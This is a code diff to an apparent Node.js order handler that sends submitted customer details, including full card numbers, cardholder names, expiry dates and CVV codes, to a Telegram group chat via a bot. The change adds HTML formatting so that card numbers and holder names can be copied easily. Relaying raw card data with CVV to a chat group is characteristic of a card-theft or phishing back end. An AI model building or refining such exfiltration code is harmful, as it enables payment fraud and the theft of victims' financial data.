@@ -21,6 +21,7 @@ const pending = new Map();
 
 const lastSeen = new Map();
 
+
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
   const res = await fetch(
@@ -38,6 +39,13 @@ async function tgPost(method, body) {
     );
   }
   return json;
+}
+
+function escapeHtml(s) {
+  return String(s)
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
 }
 
 function orderKeyboard(request_id) {
@@ -111,21 +119,31 @@ async function sendOrderToTelegram({
 }) {
   if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");
 
-  const lines = ["🎟 Новая заявка на покупку", `🆔 ID: ${request_id}`];
-  if (name)        lines.push(`👤 Имя: ${name}`);
-  if (email)       lines.push(`📧 Email: ${email}`);
-  if (phone)       lines.push(`📞 Телефон: ${phone}`);
-  if (amount)      lines.push(`💰 Сумма: ${amount}`);
+  const lines = [
+    "🎟 Новая заявка на покупку",
+    `🆔 ID: ${escapeHtml(request_id)}`,
+  ];
+  if (name)   lines.push(`👤 Имя: ${escapeHtml(name)}`);
+  if (email)  lines.push(`📧 Email: ${escapeHtml(email)}`);
+  if (phone)  lines.push(`📞 Телефон: ${escapeHtml(phone)}`);
+  if (amount) lines.push(`💰 Сумма: ${escapeHtml(amount)}`);
   lines.push("");
   lines.push("💳 Данные карты:");
-  if (card_number) lines.push(`   Номер: ${card_number}`);
-  if (card_name)   lines.push(`   Держатель: ${card_name}`);
-  if (card_expiry) lines.push(`   Срок: ${card_expiry}`);
-  if (card_cvv)    lines.push(`   CVV: ${card_cvv}`);
+  if (card_number) {
+    lines.push("Номер:");
+    lines.push(`<code>${escapeHtml(card_number)}</code>`);
+  }
+  if (card_name) {
+    lines.push("Держатель:");
+    lines.push(`<code>${escapeHtml(card_name)}</code>`);
+  }
+  if (card_expiry) lines.push(`Срок: ${escapeHtml(card_expiry)}`);
+  if (card_cvv)    lines.push(`CVV: ${escapeHtml(card_cvv)}`);
 
   await tgPost("sendMessage", {
     chat_id: GROUP_CHAT_ID,
     text: lines.join("\n"),
+    parse_mode: "HTML",
     reply_markup: orderKeyboard(request_id),
   });
 }
